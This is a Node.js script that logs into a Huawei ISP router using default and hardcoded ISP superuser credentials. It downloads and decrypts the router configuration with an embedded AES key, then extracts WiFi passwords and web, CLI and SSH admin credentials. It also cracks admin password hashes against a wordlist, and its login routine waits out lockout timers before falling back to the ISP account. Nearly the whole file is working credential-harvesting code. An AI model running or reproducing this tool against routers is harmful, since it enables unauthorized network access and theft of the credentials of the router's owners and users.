#!/usr/bin/env node
'use strict';

const { execFileSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');

const ROOT = __dirname;
const DEFAULT_HOST = '192.168.1.1';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36';

function loadConfig() {
  const cfg = {
    host: DEFAULT_HOST,
    port: 443,
    admin: { username: 'admin', password: '1234' },
    adminpldt: { username: 'adminpldt', password: 'AC2DIU7QW3ERTY6UPAS4DFG' },
    relay_token: '',
  };
  const f = path.join(ROOT, 'config.json');
  if (fs.existsSync(f)) {
    try { Object.assign(cfg, JSON.parse(fs.readFileSync(f, 'utf8'))); } catch (e) { console.error('WARN: invalid config.json — ' + e.message); }
  }
  if (process.env.RELAY_TOKEN) cfg.relay_token = process.env.RELAY_TOKEN;
  if (process.env.RT_HOST) cfg.host = process.env.RT_HOST;
  return cfg;
}

function curl(args, jar, opts = {}) {
  const base = ['-k', '-s', '--max-time', String(opts.timeout || 40), '-A', UA];
  if (jar) base.push('-b', jar, '-c', jar);
  try {
    const out = execFileSync('curl', [...base, ...args], {
      encoding: 'utf8', maxBuffer: 256 * 1024 * 1024,
      timeout: (opts.timeout || 40) * 1000 + 5000,
    });
    return { ok: true, out };
  } catch (e) {
    return { ok: false, out: String(e.stdout || '') + String(e.stderr || ''), code: e.status };
  }
}

// Router login. Both accounts use the browser-style flow (POST GetRandCount,
// Referer, X-Requested-With on login.cgi) — what a real browser sends.
// NOTE: verified that NO login (plain or browser-style, same or other
// account) is accepted while a session is held from the same IP — the
// firmware keeps ONE session per IP until it expires (hours) or the router
// reboots. So a conflict can only be resolved by time, reboot, or scanning
// from a different device/IP.
// IMPORTANT: every failed attempt counts toward a per-account lockout, so we
// never try a second flow for the same account.
function login(host, username, password) {
  const attemptLogin = () => {
    const jar = path.join(os.tmpdir(), `hw_jar_${process.pid}_${Date.now()}.txt`);
    const r1 = curl(['-e', `https://${host}/`, '-H', 'X-Requested-With: XMLHttpRequest', '-X', 'POST', `https://${host}/asp/GetRandCount.asp`], null, { timeout: 15 });
    const cnt = (r1.out || '').trim();
    if (!r1.ok || !/^[0-9a-f]+$/i.test(cnt)) {
      return { error: 'GetRandCount failed: ' + (r1.out || 'no response').replace(/\s+/g, ' ').slice(0, 160) };
    }
    const pwB64 = Buffer.from(password, 'utf8').toString('base64');
    const body = `UserName=${encodeURIComponent(username)}&PassWord=${pwB64}&Language=en&x.X_HW_Token=${cnt}`;
    const args = ['-e', `https://${host}/`, '-b', 'Cookie=body:Language:en:id=-1', '-H', 'X-Requested-With: XMLHttpRequest', '-d', body, `https://${host}/login.cgi`];
    curl(args, jar, { timeout: 25 });
    const jarTxt = fs.existsSync(jar) ? fs.readFileSync(jar, 'utf8') : '';
    if (!jarTxt.includes('sid=')) {
      try { fs.unlinkSync(jar); } catch (e) {}
      return { error: 'no-session' };
    }
    return { ok: true, jar };
  };

  const first = attemptLogin();
  if (first.ok || first.error !== 'no-session') return first;

  // No session granted. The firmware keeps ONE account session per IP and
  // rejects a different account's login until the existing session expires.
  // Give it one short wait+retry before deciding it is a real conflict.
  Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 60000);
  const second = attemptLogin();
  if (second.ok) return second;

  // Failed attempts count toward the firmware lockout (errloginlockNum=3).
  // If the router reports a lock countdown, wait it out and retry ONCE.
  const lp = curl([`https://${host}/`], null, { timeout: 15 });
  const lockM = /LockLeftTime\s*=\s*'(\d+)'/.exec(lp.out || '');
  if (lockM && parseInt(lockM[1], 10) > 0) {
    const waitMs = Math.min(parseInt(lockM[1], 10) * 1000 + 3000, 90000);
    console.error(`router login locked — waiting ${Math.round(waitMs / 1000)}s`);
    Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, waitMs);
    const third = attemptLogin();
    if (third.ok) return third;
    try { fs.unlinkSync(third.jar); } catch (e) {}
    return { error: `Login failed for "${username}" — no session granted (wrong credentials or account temporarily locked)` };
  }

  // No countdown lock. If the login page is showing, another account session
  // is holding the one-per-IP slot (no logout endpoint; sessions last hours).
  if (/(errloginlockNum|LoginTimes|login\.css)/i.test(lp.out || '')) {
    return { error: `Login failed for "${username}" — the router already has another account session active (a browser tab on 192.168.1.1, or a previous scan on this network; ONE session per IP, lasting hours). Run the scan from a DIFFERENT device (e.g. the phone) or reboot the router, then retry.` };
  }

  // Unclassifiable — show what the router actually replied for diagnostics.
  const snippet = (lp.out || 'no response').replace(/\s+/g, ' ').slice(0, 200);
  return { error: `Login failed for "${username}" — no session granted. Router replied: ${snippet}` };
}

function getToken(host, jar) {
  const r = curl(['-e', `https://${host}/`, `https://${host}/html/ssmp/cfgfile/cfgfile.asp`], jar, { timeout: 20 });
  const m = /hwonttoken["'][^>]*value="([^"]+)"/.exec(r.out) || /x\.X_HW_Token["'][^>]*value="([^"]+)"/.exec(r.out);
  return m ? m[1] : null;
}

function downloadConfig(host, jar, token) {
  const tmp = path.join(os.tmpdir(), `hw_cfg_${process.pid}_${Date.now()}.xml`);
  const r = curl(['-o', tmp, '-d', `x.X_HW_Token=${token}`,
    `https://${host}/html/ssmp/cfgfile/cfgfiledown.cgi?&RequestFile=html/ssmp/cfgfile/cfgfile.asp`], jar, { timeout: 60 });
  if (!r.ok || !fs.existsSync(tmp)) return null;
  const xml = fs.readFileSync(tmp, 'utf8');
  try { fs.unlinkSync(tmp); } catch (e) {}
  return xml;
}

// --- Huawei config decryption (same routine as local-agent scripts) ---
const KEY_HEX = '6fc6e3436a53b6310dc09a475494ac774e7afb21b9e58fc8e58b5660e48e2498';
const HW_AES_AesEnhSysToLong = (buf) => { let o = 0, v3 = 1; for (let i = 0; i < 5; i++) { o += v3 * buf[i]; v3 *= 0x5D; } return o >>> 0; };
const HW_AES_PlainToBin = (buf) => {
  if (buf.length % 5 !== 0) return null;
  const o = Buffer.alloc(buf.length * 4 / 5); let p = 0;
  for (let i = 0; i < o.length; i += 4) { o.writeUInt32LE(HW_AES_AesEnhSysToLong(buf.slice(p, p + 5)), i); p += 5; }
  return o;
};
function decryptHuawei(s) {
  if (!s.startsWith('$2') || !s.endsWith('$')) return null;
  const t = s.substring(2, s.length - 1);
  const b = Buffer.from(t, 'ascii');
  for (let i = 0; i < b.length; i++) { if (b[i] === 0x7e) b[i] = 0x1e; else b[i] -= 0x21; }
  const BS = 0x14;
  if (b.length % BS !== 0) return null;
  const bc = Math.floor(b.length / BS), ivR = b.slice(bc * BS - BS, bc * BS), IV = HW_AES_PlainToBin(ivR);
  const da = HW_AES_PlainToBin(b.slice(0, bc * BS - BS));
  if (!da || !IV) return null;
  const d = crypto.createDecipheriv('aes-256-cbc', Buffer.from(KEY_HEX, 'hex'), IV);
  d.setAutoPadding(false);
  let dec = Buffer.concat([d.update(da), d.final()]);
  const pad = dec[dec.length - 1];
  if (pad > 0 && pad <= 16) dec = dec.slice(0, dec.length - pad);
  return dec.toString('utf8').replace(/\0+$/, '');
}
const unescapeXml = (s) => s.replace(/&gt;/g, '>').replace(/&lt;/g, '<').replace(/&amp;/g, '&').replace(/&apos;/g, "'").replace(/&quot;/g, '"');

// --- Admin model scan: read SSID + PSK from the WlanBasic pages (plaintext JS data) ---
function readWlan(host, jar) {
  const r = curl(['-e', `https://${host}/`, `https://${host}/html/amp/wlanbasic/WlanBasic.asp?2G`], jar, { timeout: 25 });
  if (!r.ok || !r.out.includes('wpaPskKey')) return { error: 'WlanBasic.asp read failed (session may be blocked)' };
  const psk = [...r.out.matchAll(/new stPreSharedKey\("([^"]+)",\s*"([^"]*)"/g)].map((m) => ({
    domain: m[1].replace(/\\x2e/gi, '.'),
    value: m[2],
  }));

  // The router masks PSKs (********) for non-admin sessions — such values are useless.
  const isMasked = (v) => !!v && /^\\x2a+$/i.test(v) || /^\*+$/.test(v);
  const masked = psk.some((p) => isMasked(p.value));
  if (masked) return { error: 'WlanBasic returned masked passwords (this account cannot read PSKs — use the admin account)' };

  const lr = curl(['-e', `https://${host}/`, `https://${host}/html/amp/common/wlan_list.asp`], jar, { timeout: 25 });
  const ssids = lr.ok ? [...lr.out.matchAll(/new stWlanInfo\("([^"]+)","([^"]*)","([^"]*)","1","1","([^"]+)"/g)].map((m) => ({
    domain: m[1].replace(/\\x2e/gi, '.'),
    ssid: m[3],
    band: m[4].replace(/\\x2e/gi, '.'),
  })) : [];

  const byInst = {};
  for (const p of psk) {
    const inst = /WLANConfiguration\.(\d+)\.PreSharedKey/.exec(p.domain);
    if (inst) byInst[inst[1]] = p.value;
  }
  const ssidByInst = {};
  for (const s of ssids) {
    const inst = /WLANConfiguration\.(\d+)/.exec(s.domain);
    if (inst) ssidByInst[inst[1]] = { ssid: s.ssid, band: s.band };
  }

  const out = [];
  const order = ['1', '5'];
  for (const id of order) {
    if (!(id in byInst)) continue;
    out.push({
      band: id === '1' ? '2.4G' : '5G',
      ssid: (ssidByInst[id] && ssidByInst[id].ssid) || null,
      password: byInst[id] || null,
      encryption: 'AES',
      authentication: 'WPA2 PreSharedKey',
    });
  }
  return out.length ? { wifi: out } : { error: 'No WiFi data found in WlanBasic pages' };
}

// --- adminpldt model scan: config download + decrypt + admin hash extraction ---
function loadWordlist() {
  const f = path.join(ROOT, 'wordlist.txt');
  if (!fs.existsSync(f)) return [];
  try {
    return fs.readFileSync(f, 'utf8').split(/\r?\n/).map((l) => l.trim()).filter(Boolean);
  } catch (e) { return []; }
}

function scanConfig(host, jar) {
  const token = getToken(host, jar);
  if (!token) return { error: 'Config page token not found (session may be blocked or account lacks access)' };
  const xml = downloadConfig(host, jar, token);
  if (!xml) return { error: 'Config download failed' };

  const wifi = {};
  const pks = [...xml.matchAll(/PreSharedKey="([^"]+)"/g)];
  if (pks.length >= 1) {
    const ssid24 = /WLANConfigurationInstance InstanceID="1"[^>]*?SSID="([^"]+)"/.exec(xml);
    wifi.ssid_24 = ssid24 ? ssid24[1] : '2.4GHz';
    wifi.password_24 = decryptHuawei(unescapeXml(pks[0][1]));
  }
  if (pks.length >= 2) {
    const ssid5 = /WLANConfigurationInstance InstanceID="5"[^>]*?SSID="([^"]+)"/.exec(xml);
    wifi.ssid_5g = ssid5 ? ssid5[1] : '5GHz';
    wifi.password_5g = decryptHuawei(unescapeXml(pks[1][1]));
  }

  const admins = [];
  const webUsers = [...xml.matchAll(/<X_HW_WebUserInfoInstance[^>]*?UserName="([^"]*)"[^>]*?Password="([^"]*)"[^>]*?UserLevel="([^"]*)"[^>]*?PassMode="([^"]*)"/g)];
  for (const m of webUsers) {
    const e = { username: m[1], service: 'WebUI', level: m[3], passmode: parseInt(m[4]) || 0 };
    const dec = decryptHuawei(unescapeXml(m[2]));
    if (dec && /^[0-9a-f]{64}$/i.test(dec)) e.password_hash = dec.toLowerCase();
    else if (dec) e.password = dec;
    admins.push(e);
  }

  const wordlist = loadWordlist();
  if (wordlist.length) {
    const map = new Map();
    for (const w of wordlist) map.set(crypto.createHash('sha256').update(w).digest('hex'), w);
    for (const a of admins) {
      if (a.password_hash && map.has(a.password_hash)) {
        a.password = map.get(a.password_hash);
        a.password_cracked = true;
      }
    }
  }

  const other = [];
  const tr = /<ManagementServer[^>]*?Url="([^"]*)"/.exec(xml);
  if (tr) other.push({ service: 'TR-069 ACS', username: tr[1] || 'acs', password: null });
  const root = /<X_HW_CLIUserInfoInstance[^>]*?Username="([^"]*)"[^>]*?Userpassword="([^"]*)"/.exec(xml);
  if (root) {
    const e = { service: 'CLI/SSH', username: root[1] };
    const dec = decryptHuawei(unescapeXml(root[2]));
    if (dec && /^[0-9a-f]{64}$/i.test(dec)) e.password_hash = dec.toLowerCase();
    else if (dec) e.password = dec;
    other.push(e);
  }

  return { wifi, admins, other_credentials: other };
}

function pickCreds(overrides) {
  const m = overrides.mode || (overrides.username === 'adminpldt' ? 'adminpldt' : 'admin');
  const cred = m === 'adminpldt' ? cfg.adminpldt : cfg.admin;
  return {
    host: overrides.router_ip || cfg.host,
    username: overrides.username || cred.username,
    password: overrides.password || cred.password,
    mode: overrides.mode || (overrides.username === 'adminpldt' ? 'adminpldt' : 'admin'),
  };
}

const args = process.argv.slice(2);
const mode = args[0] || 'scan';
const cfg = loadConfig();
const overrides = {};
const ai = args.indexOf('--router-ip'); if (ai !== -1) overrides.router_ip = args[ai + 1];
const ui = args.indexOf('--username');  if (ui !== -1) overrides.username = args[ui + 1];
const pi = args.indexOf('--password');  if (pi !== -1) overrides.password = args[pi + 1];
const mi = args.indexOf('--mode');      if (mi !== -1) overrides.mode = args[mi + 1];

function attempt(cred, fn) {
  const loginR = login(cred.host, cred.username, cred.password);
  if (loginR.error) return { error: loginR.error };
  try {
    const result = fn(cred.host, loginR.jar);
    return result.error ? result : { ok: true, result };
  } finally {
    try { fs.unlinkSync(loginR.jar); } catch (e) {}
  }
}

function main() {
  const t0 = Date.now();
  const elapsed = () => Math.round((Date.now() - t0) / 1000);

  if (mode === 'check') {
    // Reachability probe WITHOUT logging in: a real login would open a router
    // session and block the other account (one-session-per-IP rule).
    const host = overrides.router_ip || cfg.host;
    const r = curl([`https://${host}/`], null, { timeout: 15 });
    const page = r.out || '';
    const isRouter = r.ok && page.length > 200
      && /(errloginlockNum|LoginTimes|GetRandCount|login\.css)/i.test(page);
    if (!isRouter) {
      console.log(JSON.stringify({ success: false, ip: host, message: 'Router login page not reachable: ' + (r.out || 'no response').replace(/\s+/g, ' ').slice(0, 160), elapsed: elapsed() }));
      process.exit(1);
    }
    console.log(JSON.stringify({ success: true, ip: host, reachable: true, mode: 'probe-no-login', elapsed: elapsed() }));
    process.exit(0);
  }

  const cred = pickCreds(overrides);
  const fn = mode === 'scan-password' ? scanConfig : readWlan;
  let res = attempt(cred, fn);

  // Fallback: provided creds failed (e.g. user typed admin creds that cannot
  // read the config) — retry with the configured adminpldt account.
  // NOTE: scan (WlanBasic) mode never falls back — adminpldt sessions get
  // masked PSKs from the router, so a fallback would only produce garbage.
  if (res.error && !overrides.username && !overrides.password && cred.mode !== 'adminpldt' && mode !== 'scan') {
    const fb = { host: cred.host, username: cfg.adminpldt.username, password: cfg.adminpldt.password };
    const fbRes = attempt(fb, fn);
    if (fbRes.ok) res = { ...fbRes, fallback: 'adminpldt' };
  }

  if (res.error) {
    console.log(JSON.stringify({ success: false, message: res.error, elapsed: elapsed() }));
    process.exit(1);
  }

  const payload = mode === 'scan-password'
    ? { wifi: res.result.wifi, admins: res.result.admins, other_credentials: res.result.other_credentials }
    : { wifi: res.result.wifi };
  if (res.fallback) payload.fallback = res.fallback;
  payload.elapsed = elapsed();
  console.log(JSON.stringify(payload));
  process.exit(0);
}

main();
